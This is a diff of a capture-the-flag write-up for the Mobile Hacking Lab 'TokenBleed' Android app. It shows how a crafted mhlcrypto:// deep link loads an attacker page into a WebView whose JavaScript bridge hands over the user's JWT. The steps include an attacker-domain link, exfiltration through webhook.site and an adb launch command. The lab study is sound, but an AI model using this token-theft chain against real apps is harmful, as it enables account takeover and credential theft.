@@ -1,3 +1,26 @@
+---
+title: Mobile Hacking Lab - TokenBleed
+description: "This challenge is centered around a fictitious Crypto exchange app, highlighting a critical security flaw related to an insecure web view implementation which can lead to exfiltration of sensitive data and 1-click account takeover."
+tags:
+  - deep-links
+  - ato
+  - intents
+  - js-interface
+  - MobileHackingLab
+  - android
+keywords:
+  - android reversing
+  - ctf writeup
+  - MHL
+  - MobileHackingLab
+  - Mobile Hacking Lab
+  - mobile writeups
+  - apk decompilation
+  - frida tool
+  - mobile security research
+canonical: https://lautarovculic.github.io/writeups/Mobile%20Hacking%20Lab%20-%20TokenBleed/
+---
+
 **Description**: This challenge is centered around a fictitious Crypto exchange app, highlighting a critical security flaw related to an insecure web view implementation which can lead to exfiltration of sensitive data and 1-click account takeover.
 
 **Link**: https://www.mobilehackinglab.com/course/lab-tokenbleed
@@ -10,14 +33,19 @@ adb install -r mhl-lab-tokenbleed.apk
 ```
 
 We can see a *typical Exchange application* (very well designed graphically).
+
 However, I noticed that one of the features is **Help Center**.
+
 ![[tokenBleed2.png]]
 
 If we go to that option, we will see the following message:
+
 *You have been successfully authenticated. Our support team can now see your account details to help you more effectively*
 
 Let's check the **source code** using **JADX**.
+
 First, we have the `AndroidManifest.xml` file to check.
+
 The *most important* part is the **`SplashActivity`** where the *flow starts* and the *deeplink* is accepted.
 ```XML
 <activity
@@ -62,6 +90,7 @@ public final class SplashActivity extends AppCompatActivity {
 **Redirects** to `MainActivity` **if a token exists**, otherwise to `LoginActivity`.
 
 Let's suppose that we already logged, so, let's check **`MainActivity`** class.
+
 The *important java code* is:
 ```java
 private final void handleIntent(Intent intent) {
@@ -84,6 +113,7 @@ private final void handleIntent(Intent intent) {
 This code **handles `VIEW` intents** -> if `scheme == mhlcrypto && host == showPage`, extracts `url` parameter and **launches** `DWebViewActivity`.
 
 So, let's move to **`DWebViewActivity`**
+
 Here we have the **WebView settings** code:
 ```java
 WebSettings settings = activityDwebViewBinding2.dwebview.getSettings();
@@ -126,6 +156,7 @@ if (stringExtra != null && StringsKt.startsWith$default(stringExtra, "http", fal
 }
 ```
 This **code hard-codes a WebView**, tightens a *few settings*, then invokes:
+
 - `dwebview.addJavascriptObject(new JsApi(this), null);`
 
 Now is time to inspect **`JsApi`** class.
@@ -168,11 +199,15 @@ public final class JsApi {
 }
 ```
 **`DSBridge`** interface exposing:
+
 - `getUserAuth(Object args, CompletionHandler<Object> handler)`: Returns **whole token JSON**.
+
 - `openNewWindow(Object args)`: Secondary navigation helper.
+
 These are the most **critical functions** in all the flow.
 
 **`TokenManager`** class have some interesting code like:
+
 • Uses `EncryptedSharedPreferences`
 ```java
 public TokenManager(Context context) {
@@ -183,6 +218,7 @@ public TokenManager(Context context) {
 }
 ```
 • `public static final String KEY_USER_AUTH = "user_auth_data";`
+
 And finally:
 ```java
 public final void saveToken(String tokenJson) {
@@ -197,10 +233,15 @@ public final void saveToken(String tokenJson) {
 **`JwtParser`** class **uses `com.auth0:java-jwt` to extract `name`, `email`, `tier` for UI**.
 
 The attacking scenario flow is the following:
+
 1. `attacker -> victim: Taps mhlcrypto://showPage?url=https://domainattacker.com/steal.html`
+
 2. `victim -> SplashActivity: OS delivers VIEW intent`
+
 3. `SplashActivity -> MainActivity: Passes through`
+
 4. `MainActivity -> DWebViewActivity: putExtra("url_to_load", <attacker URL>)`
+
 5. `DWebViewActivity -> WebView: loadUrl(<attacker URL>) -> addJavascriptObject(new JsApi(...), null)`
 
 And *DSBridge* auto-injects a **global JS object** (`dsBridge` / `_dsbridge`) enabling:
@@ -224,15 +265,21 @@ public final void getUserAuth(Object args, CompletionHandler<Object> handler) {
 *With no origin/caller validation*
 
 ### PoC
+
 You’ll need **any HTTPS-enabled hosting** where you can *drop a static file*.  
+
 I’ll use my own domain: `https://lautarovculic.com/steal.html`.
 
 To see the *incoming requests without spinning up a backend*, I’ll leverage https://webhook.site.
+
 It gives you a *unique URL that logs every hit in real-time*, perfect for **verifying that the JWT actually leaves the device**.
 
 If you pay attention in the code, you can notice the following URL:
+
 - https://mhl-cex-auth-worker.arnotstacc.workers.dev/promo/0
+
 - https://mhl-cex-auth-worker.arnotstacc.workers.dev/promo/1
+
 - https://mhl-cex-auth-worker.arnotstacc.workers.dev/help
 
 In the **source code** we can see that these URLs loads this script:
@@ -274,10 +321,13 @@ document.addEventListener("DOMContentLoaded",()=>{
 ```
 
 With the **user logged into the application**, you can go to the browser and *paste the following URL*:
+
 - `mhlcrypto://showPage?url=https://lautarovculic.com/tokenBleed.html`
+
 *Change the domain and `.html` name.*
 
 Or, you can develop an *malicious application* that **send the intent**.
+
 Or just, with this **ADB** command:
 ```bash
 adb shell am start \
@@ -287,6 +337,7 @@ adb shell am start \
 ```
 
 You can see the **token in the request**:
+
 ![[tokenBleed3.png]]
 
 And *the flag is inside of the token*:
